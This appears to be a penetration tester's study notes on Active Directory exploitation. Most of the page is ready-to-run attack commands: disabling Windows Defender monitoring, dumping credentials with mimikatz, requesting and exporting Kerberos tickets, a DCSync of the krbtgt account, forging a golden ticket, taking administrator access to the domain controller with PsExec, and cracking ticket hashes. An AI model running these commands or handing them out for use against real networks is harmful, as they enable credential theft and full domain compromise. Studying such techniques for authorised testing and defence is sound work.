# Active Directory Exploitation

---

[Back to Table of Contents](../cysec)

># Overview
 - Overview
 - Enumeration and Exploitation Tools
 - Genera Exploitation Pathway Examples

---
## AD: General Pathways

A few of the many exploitation pathways:
 - Exploiting a web-app --> lateral movement throughout the network --> domain compromise
 - Exploiting a network/service vulnerability --> lateral movement throughout the network --> domain compromise
 - Exploiting a client-side attack to compromise a user --> later movement --> domain compromise
 - Direct domain compromise and subsequent downstream lateral movement (although machines 
 in which this path was observed were substantially less realistic in my opinion)

---
## AD: Enumeration and Assessment

After gaining access to a machine within an AD network, it is essential to enumerate the environment and
understand the network, the domain, the machines within it, and where the compromised machine stands in relation
to the environment (permissions, groups, routes to admin, etc.).

Enumeration of AD can be done in various ways and many tools exist. Among them, some of the most popular and useful include sharphound/bloodhound, 
powerview, impacket, and of course, powershell.

---
## Useful Resources:
https://wadcoms.github.io/

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/active-directory-enumeration-with-powerview

https://book.hacktricks.xyz/windows-hardening/active-directory-methodology

---
## Tools
- ldapmonitor
- rubeus
- kerbrute
- impacket tools
- powerview
- sharphound
- bloodhound
- mimikatz
- pypykatz
- winpeas / windows privescheck

---

### Powerview

Disable Monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
```

Get Domain Info
```
Get-Domain
Get-DomainController
Get-Domain -Domain domain.local
Get-DomainController -Domain domain.local
Get-DomainUser
Get-DomainSID
Get-DomainPolicy
(Get-DomainPolicy)."SystemAccess"
Invoke-ShareFinder
Invoke-MapDomainTrust
```
---
### Common Privilege Escalation Methods
Overview:
- Generally revolves around results from enumeration regarding user privileges and misconfigurations. Enumeration also extends to system data which can also result in kernel exploits, just as with Linux.
Some common vectors include:
- SeImpersonate.. --> juicy potato or lovely potato (automated powershell implementation)
- UACBypass --> accesschk.exe, psexec64.exe
- Hash/password dumping


---

### Using Bloodhound
File transfer --> download sharphound --> exfiltrate the data --> view data in bloodhound
--> identify valuable accounts or pathways within the domain --> use relevant tools to try to exploit those accounts
and move laterally

```powershell
.\sharphound.exe -c Default, GPOLocalGroup, LoggedOn --zipfilename output
```
---
Use mimikatz to find vulnerable accounts with weak passwords to be used for further exploitation:
```powershell
privilege::debug

sekurlsa::logonPasswords
 ```
---
## Pass the Ticket Example

Identify service principals:
 - Get-UserSPNs.ps1

Request ticket for vulnerable SPN (this can be done with mimikatz or via powershell):

powershell method:
```
Add-Type –AssemblyName System.IdentityModel

New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken –ArgumentList ‘SPN'
```
GetUserSPNs.ps1:
```
.\GetUserSPNs.ps1
```

mimikatz method:
```
kerberos::ask /target:spn_name
```
Obtain the domain SID:
```
whoami /user
--> domain SID = user SID - last 4 numbers

```
Dump the ticket and use it either crack the hash or as a means to facilitate a pass the ticket attack. 
Dumping the tickets:
```powershell

kerberos::list /export

lsaDump::dcsync /user:krbtgt

lsadump::lsa /inject /name:krbtgt
```
Golden (silver) ticket creation):
```
kerberos::golden /domain:domain.com /sid:xxxxxxxxx-xxxxxxxxxx /rc4:xxxxx /user:fake_admin /id:500 /ptt
```

Accessing the DC with Admin privileges:

```
PsExec64.exe \\domain-dc01\ cmd.exe 
```
Or:
```
pushd \\domain-dc01\c$
cd \\domain-dc01\c$
```
Cracking the tickets:
a) Exfiltrate the kirbi files
b) use tgsrepcrack.py or kirbi2john --> john to attempt to crack the tickets --> use cracked password for authentication on servers where SPN is present
